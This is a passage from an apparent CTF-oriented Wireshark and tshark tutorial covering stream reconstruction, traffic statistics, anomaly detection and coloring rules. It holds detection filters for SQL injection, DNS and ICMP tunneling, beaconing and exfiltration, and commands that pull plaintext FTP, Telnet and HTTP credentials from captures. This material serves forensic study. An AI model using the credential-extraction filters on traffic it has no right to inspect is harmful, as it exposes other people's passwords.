function custom_proto.dissector(buffer, pinfo, tree)
    pinfo.cols.protocol = "CUSTOM"
    local subtree = tree:add(custom_proto, buffer())
    subtree:add(f_magic, buffer(0,2))
    subtree:add(f_command, buffer(2,1))
    subtree:add(f_data, buffer(3))
end

local tcp_table = DissectorTable.get("tcp.port")
tcp_table:add(9999, custom_proto)
```

Load custom dissector:

```bash
# CLI method
tshark -X lua_script:custom_protocol.lua -r capture.pcap

# Or copy to plugins directory and restart Wireshark
```

### Decode As Feature

**GUI Method:**

1. Right-click packet → **Decode As**
2. Select protocol and port mapping
3. Apply changes

**CLI Method:**

```bash
# Force decode port 8080 as HTTP
tshark -r capture.pcap -d tcp.port==8080,http -Y "http"

# Decode multiple ports
tshark -r capture.pcap -d tcp.port==8080,http -d tcp.port==9090,http

# Decode based on payload
tshark -r capture.pcap -d tcp.port==12345,tls
```

### Expert Information Analysis

```bash
# Show all expert information (warnings, errors)
tshark -r capture.pcap -Y "expert" -T fields -e expert.message -e expert.severity

# Show only errors
tshark -r capture.pcap -Y "expert.severity == 0x00800000"

# Show warnings
tshark -r capture.pcap -Y "expert.severity == 0x00600000"

# Common expert info categories:
# - Malformed packets
# - Checksum errors  
# - Retransmissions
# - Connection resets
```

### Protocol-Specific Filters for CTF Scenarios

```bash
# FTP credentials
tshark -r capture.pcap -Y "ftp.request.command == USER || ftp.request.command == PASS" -T fields -e ftp.request.arg

# SMTP email content
tshark -r capture.pcap -Y "smtp" -T fields -e smtp.req.command -e smtp.req.parameter

# Telnet sessions (plaintext)
tshark -r capture.pcap -Y "telnet" -x

# ICMP tunneling detection
tshark -r capture.pcap -Y "icmp && data.len > 64"

# SQL injection attempts in HTTP
tshark -r capture.pcap -Y "http.request.uri contains \"union\" || http.request.uri contains \"select\""

# Base64 encoded data in HTTP
tshark -r capture.pcap -Y "http" | grep -E "[A-Za-z0-9+/]{40,}={0,2}"
```

## Follow Streams (TCP/UDP/HTTP)

### TCP Stream Following

**GUI Method:**

1. Right-click any TCP packet
2. Select **Follow → TCP Stream**
3. View bidirectional conversation
4. Options:
    - **ASCII**: Readable text
    - **Hex Dump**: Raw bytes
    - **C Arrays**: Export as C code
    - **Raw**: Binary data

**CLI Method:**

```bash
# List all TCP streams
tshark -r capture.pcap -Y "tcp" -T fields -e tcp.stream | sort -u

# Extract specific TCP stream (stream 0)
tshark -r capture.pcap -Y "tcp.stream eq 0" -w stream0.pcap

# Display TCP stream content
tshark -r capture.pcap -z follow,tcp,ascii,0

# Extract all TCP streams automatically
for stream in $(tshark -r capture.pcap -Y "tcp" -T fields -e tcp.stream | sort -u); do
    tshark -r capture.pcap -Y "tcp.stream eq $stream" -w tcp_stream_$stream.pcap
done
```

**Python Script for TCP Stream Extraction:**

```python
#!/usr/bin/env python3
import pyshark

cap = pyshark.FileCapture('capture.pcap', display_filter='tcp')

streams = {}
for packet in cap:
    if hasattr(packet.tcp, 'stream'):
        stream_id = packet.tcp.stream
        if stream_id not in streams:
            streams[stream_id] = []
        
        if hasattr(packet.tcp, 'payload'):
            payload = bytes.fromhex(packet.tcp.payload.replace(':', ''))
            streams[stream_id].append({
                'src': packet.ip.src,
                'dst': packet.ip.dst,
                'data': payload
            })

# Save each stream
for stream_id, packets in streams.items():
    with open(f'tcp_stream_{stream_id}.bin', 'wb') as f:
        for pkt in packets:
            f.write(pkt['data'])
```

### UDP Stream Following

```bash
# List UDP streams
tshark -r capture.pcap -Y "udp" -T fields -e udp.stream | sort -u

# Follow UDP stream
tshark -r capture.pcap -z follow,udp,ascii,0

# Extract UDP stream
tshark -r capture.pcap -Y "udp.stream eq 0" -w udp_stream_0.pcap

# UDP stream between specific endpoints
tshark -r capture.pcap -Y "udp && ip.src == 192.168.1.10 && ip.dst == 192.168.1.20"
```

### HTTP Stream Analysis

```bash
# Extract HTTP objects
tshark -r capture.pcap --export-objects http,exported_http/

# List HTTP requests and responses
tshark -r capture.pcap -Y "http.request || http.response" -T fields -e http.request.method -e http.request.uri -e http.response.code

# Follow HTTP stream
tshark -r capture.pcap -z follow,http,ascii,0

# Extract complete HTTP conversations
tshark -r capture.pcap -Y "http" -T fields -e tcp.stream -e http.request.method -e http.request.uri -e http.response.code
```

**HTTP Object Export via GUI:**

1. **File → Export Objects → HTTP**
2. Filter by content type
3. Select objects to save
4. Click **Save All**

### Stream Reconstruction for CTF

**Scenario: Reconstructing File Transfer over TCP**

```bash
# Identify stream containing file transfer
tshark -r capture.pcap -Y "tcp contains \"Content-Type\"" -T fields -e tcp.stream

# Extract stream
tshark -r capture.pcap -Y "tcp.stream eq 5" -T fields -e tcp.payload > stream5_hex.txt

# Convert hex to binary
cat stream5_hex.txt | xxd -r -p > reconstructed_file.bin

# Identify file type
file reconstructed_file.bin
```

**Using Scapy for Stream Reconstruction:**

```python
#!/usr/bin/env python3
from scapy.all import *

packets = rdpcap('capture.pcap')

# Filter by TCP stream (src/dst ip and port combination)
stream_filter = lambda p: (p.haslayer(TCP) and 
                          p[IP].src == '192.168.1.10' and 
                          p[IP].dst == '192.168.1.20' and
                          p[TCP].sport == 54321 and 
                          p[TCP].dport == 80)

stream_packets = [p for p in packets if stream_filter(p)]

# Sort by sequence number
stream_packets.sort(key=lambda p: p[TCP].seq)

# Extract payload
payload = b''.join([bytes(p[TCP].payload) for p in stream_packets if len(p[TCP].payload) > 0])

with open('reconstructed.bin', 'wb') as f:
    f.write(payload)
```

### TLS Stream Analysis

```bash
# Export TLS session keys (if available)
tshark -r capture.pcap -Y "tls" -T fields -e tls.handshake.session_id

# With decryption enabled, follow decrypted stream
tshark -r capture.pcap -o tls.keylog_file:sslkey.log -z follow,tls,ascii,0

# Extract decrypted HTTP from TLS
tshark -r capture.pcap -o tls.keylog_file:sslkey.log -Y "http" -T fields -e http.request.uri
```

### WebSocket Stream Following

```bash
# WebSocket handshake
tshark -r capture.pcap -Y "websocket.opcode"

# Follow WebSocket stream
tshark -r capture.pcap -z follow,websocket,ascii,0

# Extract WebSocket messages
tshark -r capture.pcap -Y "websocket.payload" -T fields -e websocket.payload
```

### Stream Carving Techniques

**Automated Stream Carving Script:**

```bash
#!/bin/bash
PCAP="capture.pcap"
OUTPUT_DIR="carved_streams"

mkdir -p $OUTPUT_DIR

# Extract all TCP streams
for stream in $(tshark -r $PCAP -Y "tcp" -T fields -e tcp.stream | sort -u); do
    echo "Processing TCP stream $stream"
    tshark -r $PCAP -Y "tcp.stream eq $stream" -T fields -e tcp.payload | \
    tr -d '\n' | tr -d ':' | xxd -r -p > $OUTPUT_DIR/tcp_stream_$stream.bin
    
    # Identify file type
    file $OUTPUT_DIR/tcp_stream_$stream.bin
done

# Extract HTTP objects
tshark -r $PCAP --export-objects http,$OUTPUT_DIR/http_objects/
```

### Stream Analysis for Protocol Violations

```bash
# Find incomplete TCP handshakes (SYN without SYN-ACK)
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" -T fields -e ip.src -e ip.dst -e tcp.dstport | \
while read src dst port; do
    synack=$(tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 1 && ip.src == $dst && ip.dst == $src" | wc -l)
    if [ $synack -eq 0 ]; then
        echo "Incomplete handshake: $src -> $dst:$port"
    fi
done

# Find TCP streams without proper closure (no FIN/RST)
tshark -r capture.pcap -Y "tcp.stream" -T fields -e tcp.stream | sort -u | \
while read stream; do
    fin_count=$(tshark -r capture.pcap -Y "tcp.stream eq $stream && (tcp.flags.fin == 1 || tcp.flags.reset == 1)" | wc -l)
    if [ $fin_count -eq 0 ]; then
        echo "Stream $stream: No proper closure"
    fi
done
```

## Statistics & Endpoints

### Conversations Analysis

**GUI Method:**

1. **Statistics → Conversations**
2. Select protocol tab (Ethernet/IPv4/TCP/UDP)
3. Sort by packets, bytes, or duration
4. Right-click to apply as filter

**CLI Method:**

```bash
# TCP conversations
tshark -r capture.pcap -qz conv,tcp

# UDP conversations
tshark -r capture.pcap -qz conv,udp

# IP conversations
tshark -r capture.pcap -qz conv,ip

# Ethernet conversations (MAC level)
tshark -r capture.pcap -qz conv,eth

# Export conversations to CSV
tshark -r capture.pcap -qz conv,tcp > tcp_conversations.txt
```

**Parsing Conversations for CTF:**

```python
#!/usr/bin/env python3
import subprocess
import re

result = subprocess.run(['tshark', '-r', 'capture.pcap', '-qz', 'conv,tcp'], 
                       capture_output=True, text=True)

lines = result.stdout.split('\n')
conversations = []

for line in lines:
    if '<->' in line:
        parts = line.split()
        conv = {
            'src': parts[0],
            'dst': parts[2],
            'packets': int(parts[3]),
            'bytes': int(parts[4])
        }
        conversations.append(conv)

# Find largest conversation by bytes
largest = max(conversations, key=lambda x: x['bytes'])
print(f"Largest conversation: {largest['src']} <-> {largest['dst']}: {largest['bytes']} bytes")
```

### Endpoints Analysis

```bash
# Show all IPv4 endpoints
tshark -r capture.pcap -qz endpoints,ip

# Show TCP endpoints (IP + port)
tshark -r capture.pcap -qz endpoints,tcp

# Show UDP endpoints
tshark -r capture.pcap -qz endpoints,udp

# Ethernet endpoints (MAC addresses)
tshark -r capture.pcap -qz endpoints,eth
```

**Top Talkers Identification:**

```bash
# Top source IPs by packet count
tshark -r capture.pcap -T fields -e ip.src | sort | uniq -c | sort -rn | head -10

# Top destination IPs
tshark -r capture.pcap -T fields -e ip.dst | sort | uniq -c | sort -rn | head -10

# Top source ports
tshark -r capture.pcap -T fields -e tcp.srcport -e udp.srcport | sort | uniq -c | sort -rn | head -10

# Top destination ports
tshark -r capture.pcap -T fields -e tcp.dstport -e udp.dstport | sort | uniq -c | sort -rn | head -10
```

### I/O Graph Analysis

**GUI Method:**

1. **Statistics → I/O Graph**
2. Add filters for different traffic types
3. Configure Y-axis (Packets/Bytes/Bits)
4. Set interval granularity

**CLI Equivalent:**

```bash
# Generate I/O statistics
tshark -r capture.pcap -qz io,stat,1  # 1-second intervals

# Traffic by protocol over time
tshark -r capture.pcap -qz io,stat,1,"tcp","udp","icmp"

# HTTP traffic over time
tshark -r capture.pcap -qz io,stat,1,"http"

# Specific filter statistics
tshark -r capture.pcap -qz io,stat,1,"ip.addr==192.168.1.10"
```

### Packet Length Distribution

```bash
# Packet length statistics
tshark -r capture.pcap -qz plen,tree

# Frame size distribution
tshark -r capture.pcap -T fields -e frame.len | \
awk '{
    if($1<=64) s64++
    else if($1<=128) s128++
    else if($1<=256) s256++
    else if($1<=512) s512++
    else if($1<=1024) s1024++
    else s1500++
}
END {
    print "0-64:", s64
    print "65-128:", s128
    print "129-256:", s256
    print "257-512:", s512
    print "513-1024:", s1024
    print "1025+:", s1500
}'
```

### Service Response Time (SRT)

```bash
# DNS query response times
tshark -r capture.pcap -qz srt,dns

# SMB response times
tshark -r capture.pcap -qz srt,smb

# HTTP load distribution
tshark -r capture.pcap -qz http,tree

# Custom response time analysis
tshark -r capture.pcap -Y "dns" -T fields -e dns.time | \
awk '{sum+=$1; count++} END {print "Avg DNS response:", sum/count, "ms"}'
```

### Flow Graph Analysis

**GUI Method:**

1. **Statistics → Flow Graph**
2. Select flow type (TCP/UDP/Any)
3. Choose address type (Network/All)
4. Visualize packet flow timeline

Useful for understanding communication sequences in CTF challenges.

### HTTP Statistics

```bash
# HTTP request methods distribution
tshark -r capture.pcap -qz http,tree

# HTTP status codes
tshark -r capture.pcap -Y "http.response" -T fields -e http.response.code | sort | uniq -c

# HTTP hosts contacted
tshark -r capture.pcap -Y "http.request" -T fields -e http.host | sort | uniq -c

# HTTP URIs requested
tshark -r capture.pcap -Y "http.request" -T fields -e http.request.uri | sort | uniq

# User agents in capture
tshark -r capture.pcap -Y "http.request" -T fields -e http.user_agent | sort | uniq
```

### DNS Statistics

```bash
# DNS query/response statistics
tshark -r capture.pcap -qz dns,tree

# Top queried domains
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | sort | uniq -c | sort -rn | head -20

# DNS response codes distribution
tshark -r capture.pcap -Y "dns.flags.response == 1" -T fields -e dns.flags.rcode | sort | uniq -c

# DNS query types
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.type | sort | uniq -c
```

### TLS/SSL Statistics

```bash
# TLS versions in use
tshark -r capture.pcap -Y "tls.handshake.version" -T fields -e tls.handshake.version | sort | uniq -c

# Cipher suites negotiated
tshark -r capture.pcap -Y "tls.handshake.type == 2" -T fields -e tls.handshake.ciphersuite | sort | uniq -c

# Server names (SNI)
tshark -r capture.pcap -Y "tls.handshake.extensions_server_name" -T fields -e tls.handshake.extensions_server_name | sort | uniq

# Certificate subjects
tshark -r capture.pcap -Y "tls.handshake.certificate" -T fields -e x509sat.printableString | sort | uniq
```

### Bandwidth Analysis

```bash
# Total bandwidth calculation
capinfos capture.pcap

# Bandwidth per IP
tshark -r capture.pcap -T fields -e ip.src -e frame.len | \
awk '{ip[$1]+=$2} END {for(i in ip) print i, ip[i]}'  | sort -k2 -rn

# Bandwidth over time (bytes per second)
tshark -r capture.pcap -T fields -e frame.time_epoch -e frame.len | \
awk '{time=int($1); bytes[time]+=$2} END {for(t in bytes) print t, bytes[t]}' | sort -n
```

### Advanced Statistical Queries

**Detect Port Scanning:**

```bash
# Count unique destination ports per source IP
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" -T fields -e ip.src -e tcp.dstport | \
awk '{ports[$1]++} END {for(ip in ports) if(ports[ip] > 100) print ip, "scanned", ports[ip], "ports"}'
```

**Detect Beaconing (C2 Communication):**

```bash
# Find connections with regular time intervals
tshark -r capture.pcap -Y "tcp.stream" -T fields -e tcp.stream -e frame.time_epoch | \
awk '{
    if($1 != prev_stream) {
        prev_time = 0
        prev_stream = $1
    }
    if(prev_time > 0) {
        delta = $2 - prev_time
        print $1, delta
    }
    prev_time = $2
}' | awk '{sum[$1]+=$2; count[$1]++} END {for(s in sum) print s, sum[s]/count[s]}' | \
awk '$2 > 50 && $2 < 70 {print "Potential beacon in stream", $1, "with", $2, "sec interval"}'
```

**Data Exfiltration Detection:**

```bash
# Find large outbound transfers
tshark -r capture.pcap -Y "ip.src == 192.168.1.10" -T fields -e ip.dst -e frame.len | \
awk '{bytes[$1]+=$2} END {for(ip in bytes) if(bytes[ip] > 1000000) print ip, bytes[ip], "bytes transferred"}'
```

### Export Statistics to CSV

```bash
# Conversations to CSV
tshark -r capture.pcap -qz conv,tcp | grep '<->' | \
awk '{print $1","$3","$4","$5}' > conversations.csv

# Endpoints to CSV
tshark -r capture.pcap -qz endpoints,ip | grep -E '[0-9]+\.[0-9]+' | \
awk '{print $1","$2","$3}' > endpoints.csv
```

### Comprehensive CTF Statistics Script

```bash
#!/bin/bash
PCAP="$1"
OUTPUT="statistics_report.txt"

echo "=== CTF Network Statistics Report ===" > $OUTPUT
echo "File: $PCAP" >> $OUTPUT
echo "" >> $OUTPUT

echo "=== Basic Info ===" >> $OUTPUT
capinfos $PCAP >> $OUTPUT
echo "" >> $OUTPUT

echo "=== Protocol Hierarchy ===" >> $OUTPUT
tshark -r $PCAP -qz io,phs >> $OUTPUT
echo "" >> $OUTPUT

echo "=== Top 10 Source IPs ===" >> $OUTPUT
tshark -r $PCAP -T fields -e ip.src | sort | uniq -c | sort -rn | head -10 >> $OUTPUT
echo "" >> $OUTPUT

echo "=== Top 10 Destination IPs ===" >> $OUTPUT
tshark -r $PCAP -T fields -e ip.dst | sort | uniq -c | sort -rn | head -10 >> $OUTPUT
echo "" >> $OUTPUT

echo "=== Top 10 TCP Ports ===" >> $OUTPUT
tshark -r $PCAP -T fields -e tcp.dstport | sort | uniq -c | sort -rn | head -10 >> $OUTPUT
echo "" >> $OUTPUT

echo "=== Top 10 UDP Ports ===" >> $OUTPUT
tshark -r $PCAP -T fields -e udp.dstport | sort | uniq -c | sort -rn | head -10 >> $OUTPUT
echo "" >> $OUTPUT

echo "=== DNS Queries ===" >> $OUTPUT
tshark -r $PCAP -Y "dns.flags.response == 0" -T fields -e dns.qry.name | sort | uniq -c | sort -rn | head -20 >> $OUTPUT
echo "" >> $OUTPUT

echo "=== HTTP Hosts ===" >> $OUTPUT
tshark -r $PCAP -Y "http.request" -T fields -e http.host | sort | uniq -c | sort -rn >> $OUTPUT
echo "" >> $OUTPUT

echo "=== TLS/SSL Server Names ===" >> $OUTPUT
tshark -r $PCAP -Y "tls.handshake.extensions_server_name" -T fields -e tls.handshake.extensions_server_name | sort | uniq >> $OUTPUT
echo "" >> $OUTPUT

echo "=== Expert Info Summary ===" >> $OUTPUT
tshark -r $PCAP -Y "expert" -T fields -e expert.severity -e expert.message | sort | uniq -c >> $OUTPUT
echo "" >> $OUTPUT

echo "=== TCP Conversations ===" >> $OUTPUT
tshark -r $PCAP -qz conv,tcp | head -20 >> $OUTPUT
echo "" >> $OUTPUT

echo "Report saved to $OUTPUT"
```

### Time-Based Analysis

```bash
# First and last packet timestamps
tshark -r capture.pcap -T fields -e frame.time | head -1
tshark -r capture.pcap -T fields -e frame.time | tail -1

# Packets per hour
tshark -r capture.pcap -T fields -e frame.time_epoch | \
awk '{print strftime("%Y-%m-%d %H:00", $1)}' | sort | uniq -c

# Find time gaps (potential capture interruptions)
tshark -r capture.pcap -T fields -e frame.time_epoch | \
awk 'NR>1 {delta = $1 - prev; if(delta > 60) print "Gap of", delta, "seconds at", prev} {prev = $1}'

# Traffic during specific time window
tshark -r capture.pcap -Y "frame.time >= \"2025-01-01 10:00:00\" && frame.time <= \"2025-01-01 11:00:00\""
```

### Round Trip Time (RTT) Analysis

```bash
# Calculate RTT for TCP connections
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" -T fields -e frame.number -e frame.time_epoch -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport > syn_packets.txt

tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 1" -T fields -e frame.number -e frame.time_epoch -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport > synack_packets.txt

# Python script to calculate RTT
python3 << 'EOF'
syn = {}
with open('syn_packets.txt') as f:
    for line in f:
        if line.strip():
            parts = line.split()
            key = (parts[2], parts[3], parts[4], parts[5])
            syn[key] = float(parts[1])

with open('synack_packets.txt') as f:
    for line in f:
        if line.strip():
            parts = line.split()
            key = (parts[3], parts[2], parts[5], parts[4])  # Reversed
            if key in syn:
                rtt = (float(parts[1]) - syn[key]) * 1000
                print(f"RTT: {rtt:.2f} ms for {parts[2]}:{parts[4]} -> {parts[3]}:{parts[5]}")
EOF
```

### Packet Timing Analysis

```bash
# Inter-packet arrival time
tshark -r capture.pcap -T fields -e frame.time_delta | \
awk '{sum+=$1; count++; if($1>max) max=$1; if(min=="" || $1<min) min=$1} 
END {print "Min:", min, "Max:", max, "Avg:", sum/count}'

# Detect traffic bursts
tshark -r capture.pcap -T fields -e frame.time_epoch | \
awk '{
    bucket = int($1)
    count[bucket]++
}
END {
    for(b in count) {
        if(count[b] > 1000) print "Burst at", strftime("%Y-%m-%d %H:%M:%S", b), "with", count[b], "packets"
    }
}'
```

### Geolocation Analysis

[Inference] Geolocation requires external databases and may not be accurate for all IPs.

```bash
# Extract unique external IPs
tshark -r capture.pcap -T fields -e ip.src -e ip.dst | \
tr '\t' '\n' | sort -u | grep -v "^192.168\|^10\.\|^172\.(1[6-9]|2[0-9]|3[01])\.\|^127\." > external_ips.txt

# Use GeoIP (requires geoip-database package)
# [Unverified] GeoIP accuracy depends on database version
for ip in $(cat external_ips.txt); do
    geoiplookup $ip
done
```

### Statistical Anomaly Detection

**Packet Size Anomalies:**

```bash
# Calculate mean and standard deviation
tshark -r capture.pcap -T fields -e frame.len | \
awk '{sum+=$1; sumsq+=$1*$1; count++} 
END {
    mean=sum/count
    stddev=sqrt((sumsq/count)-(mean*mean))
    print "Mean:", mean, "StdDev:", stddev
    print "Outlier threshold (3σ):", mean+(3*stddev)
}'

# Find outlier packets
THRESHOLD=2000  # Adjust based on above calculation
tshark -r capture.pcap -Y "frame.len > $THRESHOLD" -T fields -e frame.number -e frame.len -e ip.src -e ip.dst
```

**Connection Duration Anomalies:**

```bash
# Find long-lived connections
tshark -r capture.pcap -qz conv,tcp | \
awk '/^[0-9]/ {if($NF > 300) print $0, "(duration:", $NF, "sec)"}'
```

### IPv6 Statistics

```bash
# IPv6 traffic percentage
TOTAL=$(tshark -r capture.pcap | wc -l)
IPV6=$(tshark -r capture.pcap -Y "ipv6" | wc -l)
echo "IPv6 traffic: $IPV6 / $TOTAL packets ($(($IPV6 * 100 / $TOTAL))%)"

# IPv6 addresses
tshark -r capture.pcap -Y "ipv6" -T fields -e ipv6.src -e ipv6.dst | tr '\t' '\n' | sort -u

# ICMPv6 neighbor discovery
tshark -r capture.pcap -Y "icmpv6"
```

### Multicast/Broadcast Analysis

```bash
# Broadcast packets
tshark -r capture.pcap -Y "eth.dst == ff:ff:ff:ff:ff:ff"

# Multicast packets
tshark -r capture.pcap -Y "ip.dst >= 224.0.0.0 && ip.dst <= 239.255.255.255"

# Count by type
tshark -r capture.pcap -Y "eth.dst == ff:ff:ff:ff:ff:ff" -T fields -e frame.protocols | sort | uniq -c
```

### Fragmentation Analysis

```bash
# IPv4 fragmented packets
tshark -r capture.pcap -Y "ip.flags.mf == 1 || ip.frag_offset > 0" -T fields -e ip.id -e ip.frag_offset -e ip.flags.mf

# Group fragments by IP ID
tshark -r capture.pcap -Y "ip.flags.mf == 1 || ip.frag_offset > 0" -T fields -e ip.id | sort | uniq -c

# Potential fragmentation attacks (many fragments)
tshark -r capture.pcap -Y "ip.flags.mf == 1 || ip.frag_offset > 0" -T fields -e ip.id | \
sort | uniq -c | awk '$1 > 20 {print "Suspicious fragmentation: ID", $2, "has", $1, "fragments"}'
```

### Protocol-Specific Statistical Analysis

**SMB/CIFS Statistics:**

```bash
# SMB commands
tshark -r capture.pcap -Y "smb || smb2" -T fields -e smb.cmd -e smb2.cmd | sort | uniq -c

# SMB file operations
tshark -r capture.pcap -Y "smb.file" -T fields -e smb.file

# SMB authentication attempts
tshark -r capture.pcap -Y "smb.nt_status" -T fields -e smb.nt_status | grep -i "logon"
```

**FTP Statistics:**

```bash
# FTP commands distribution
tshark -r capture.pcap -Y "ftp" -T fields -e ftp.request.command | sort | uniq -c

# FTP response codes
tshark -r capture.pcap -Y "ftp.response.code" -T fields -e ftp.response.code | sort | uniq -c

# FTP file transfers
tshark -r capture.pcap -Y "ftp-data"
```

**ICMP Analysis:**

```bash
# ICMP types and codes
tshark -r capture.pcap -Y "icmp" -T fields -e icmp.type -e icmp.code | sort | uniq -c

# ICMP echo requests (ping)
tshark -r capture.pcap -Y "icmp.type == 8"

# ICMP unreachable messages
tshark -r capture.pcap -Y "icmp.type == 3" -T fields -e icmp.code

# Potential ICMP tunneling
tshark -r capture.pcap -Y "icmp && data.len > 64" -T fields -e frame.number -e data.len
```

### Credential Extraction Statistics

```bash
# Count authentication attempts by protocol
echo "=== Authentication Summary ==="

# HTTP Basic Auth
HTTP_AUTH=$(tshark -r capture.pcap -Y "http.authorization" | wc -l)
echo "HTTP Basic Auth attempts: $HTTP_AUTH"

# FTP logins
FTP_USER=$(tshark -r capture.pcap -Y "ftp.request.command == USER" | wc -l)
echo "FTP login attempts: $FTP_USER"

# Telnet sessions
TELNET=$(tshark -r capture.pcap -Y "telnet" | wc -l)
echo "Telnet packets: $TELNET"

# NTLM authentication
NTLM=$(tshark -r capture.pcap -Y "ntlmssp" | wc -l)
echo "NTLM authentication packets: $NTLM"

# Kerberos
KERBEROS=$(tshark -r capture.pcap -Y "kerberos" | wc -l)
echo "Kerberos packets: $KERBEROS"
```

### Export Statistics Visualization Data

**Generate data for external plotting:**

```bash
# Traffic over time (for gnuplot/matplotlib)
tshark -r capture.pcap -T fields -e frame.time_epoch -e frame.len | \
awk '{time=int($1); bytes[time]+=$2} END {for(t in bytes) print t, bytes[t]}' | \
sort -n > traffic_timeline.dat

# Protocol distribution (for pie chart)
tshark -r capture.pcap -T fields -e frame.protocols | \
awk -F: '{print $NF}' | sort | uniq -c | sort -rn > protocol_dist.dat

# Conversation matrix data
tshark -r capture.pcap -T fields -e ip.src -e ip.dst | \
awk '{print $1, $2}' | sort | uniq -c > conversation_matrix.dat
```

**Python visualization example:**

```python
#!/usr/bin/env python3
import matplotlib.pyplot as plt
import pandas as pd

# Load traffic timeline
data = pd.read_csv('traffic_timeline.dat', sep=' ', names=['timestamp', 'bytes'])
data['timestamp'] = pd.to_datetime(data['timestamp'], unit='s')

plt.figure(figsize=(12, 6))
plt.plot(data['timestamp'], data['bytes'])
plt.xlabel('Time')
plt.ylabel('Bytes per Second')
plt.title('Network Traffic Over Time')
plt.xticks(rotation=45)
plt.tight_layout()
plt.savefig('traffic_timeline.png')

# Load protocol distribution
protocols = pd.read_csv('protocol_dist.dat', sep=' ', names=['count', 'protocol'])
plt.figure(figsize=(10, 8))
plt.pie(protocols['count'], labels=protocols['protocol'], autopct='%1.1f%%')
plt.title('Protocol Distribution')
plt.savefig('protocol_pie.png')
```

### Performance Statistics

```bash
# Capture file analysis
capinfos -T capture.pcap

# Average packet rate
capinfos -c -u capture.pcap | awk '/Average packet rate/ {print}'

# Average packet size
capinfos -z capture.pcap | awk '/Average packet size/ {print}'

# Data byte rate
capinfos -d capture.pcap | awk '/Data byte rate/ {print}'
```

### Summary Report Generator

```python
#!/usr/bin/env python3
import subprocess
import json
from collections import Counter

def get_capinfos(pcap):
    result = subprocess.run(['capinfos', '-M', pcap], 
                          capture_output=True, text=True)
    info = {}
    for line in result.stdout.split('\n'):
        if ':' in line:
            key, value = line.split(':', 1)
            info[key.strip()] = value.strip()
    return info

def get_protocols(pcap):
    result = subprocess.run(['tshark', '-r', pcap, '-T', 'fields', '-e', 'frame.protocols'],
                          capture_output=True, text=True)
    protocols = [line.split(':')[-1] for line in result.stdout.split('\n') if line]
    return Counter(protocols)

def get_top_ips(pcap):
    result = subprocess.run(['tshark', '-r', pcap, '-T', 'fields', '-e', 'ip.src'],
                          capture_output=True, text=True)
    return Counter([ip for ip in result.stdout.split('\n') if ip]).most_common(10)

def generate_report(pcap):
    report = {
        'file_info': get_capinfos(pcap),
        'protocols': dict(get_protocols(pcap)),
        'top_sources': dict(get_top_ips(pcap))
    }
    
    with open('report.json', 'w') as f:
        json.dump(report, f, indent=2)
    
    print("=== Summary Report ===")
    print(f"File: {pcap}")
    print(f"Total packets: {report['file_info'].get('Number of packets', 'N/A')}")
    print(f"Duration: {report['file_info'].get('Capture duration', 'N/A')}")
    print(f"\nTop protocols: {list(report['protocols'].keys())[:5]}")
    print(f"\nTop source IPs:")
    for ip, count in list(report['top_sources'].items())[:5]:
        print(f"  {ip}: {count} packets")

if __name__ == '__main__':
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 report.py capture.pcap")
        sys.exit(1)
    generate_report(sys.argv[1])
```

---

**Important Related Topics:**

- Display filter syntax optimization for complex queries
- Wireshark Lua API for custom statistics modules
- Packet coloring rules for visual analysis
- Profile creation for CTF-specific configurations
- Memory optimization for large capture file analysis
- Wireshark command-line tools (editcap, mergecap, text2pcap)

---

## Coloring Rules

Coloring rules apply visual highlighting to packets based on filter expressions, enabling rapid identification of traffic patterns, anomalies, and specific protocols during analysis.

**Accessing Coloring Rules**

```
View > Coloring Rules
or
Ctrl + Shift + K (Windows/Linux)
Cmd + Shift + K (macOS)
```

**Default Color Scheme** (common defaults, may vary by version)

- **Light Green**: TCP traffic
- **Light Blue**: UDP traffic
- **Black**: Packets with errors/warnings
- **Red**: TCP problems (retransmissions, resets, out-of-order)
- **Dark Green**: HTTP traffic
- **Light Yellow**: Routing protocols
- **Blue**: DNS traffic
- **Gray**: TCP/UDP checksum errors
- **Pink**: ICMP errors

**Coloring Rule Structure** Each rule consists of:

- **Name**: Descriptive label
- **Filter String**: Display filter expression
- **Foreground Color**: Text color
- **Background Color**: Row highlight color

Rules are applied **top to bottom** - first matching rule wins.

**Managing Coloring Rules**

```
# Enable/Disable coloring
View > Colorize Packet List

# Temporarily disable specific rule
Uncheck box next to rule in Coloring Rules dialog

# Reorder rules
Select rule and use Up/Down buttons (order matters!)

# Import/Export rules
Coloring Rules dialog > Import/Export buttons
File format: XML-based colorfilters
```

**Creating Custom Coloring Rules**

**Example 1: Highlight Specific IP Address**

```
Name: Target Host
Filter: ip.addr == 192.168.1.100
Foreground: Black
Background: Yellow
```

**Example 2: HTTP POST Requests**

```
Name: HTTP POST
Filter: http.request.method == "POST"
Foreground: White
Background: Dark Red
```

**Example 3: Failed Login Attempts**

```
Name: Failed Auth
Filter: http.response.code == 401 or http.response.code == 403
Foreground: White
Background: Red
```

**Example 4: Large Data Transfers**

```
Name: Large Packets
Filter: frame.len > 1400
Foreground: Black
Background: Orange
```

**Example 5: Encrypted Traffic**

```
Name: TLS/SSL
Filter: tls or ssl
Foreground: White
Background: Dark Green
```

**CTF-Oriented Coloring Rules**

**Suspicious Traffic Patterns**

```
Name: Port Scanning
Filter: tcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size <= 1024
Background: Red

Name: Null Scans
Filter: tcp.flags == 0x000
Background: Dark Red

Name: Xmas Scans
Filter: tcp.flags.fin==1 and tcp.flags.push==1 and tcp.flags.urg==1
Background: Purple

Name: Excessive Connections
Filter: tcp.flags.syn==1
Background: Light Pink
(Then analyze Statistics > Conversations)
```

**Data Exfiltration Indicators**

```
Name: DNS Tunneling
Filter: dns.qry.name.len > 50
Background: Orange

Name: ICMP Tunneling
Filter: icmp.data.len > 64
Background: Orange

Name: HTTP Uploads
Filter: http.request.method == "PUT" or http.request.method == "POST"
Background: Yellow

Name: Large Outbound
Filter: ip.dst != 192.168.0.0/16 and frame.len > 1000
Background: Light Orange
(Adjust network range to your environment)
```

**Credential Hunting**

```
Name: FTP Credentials
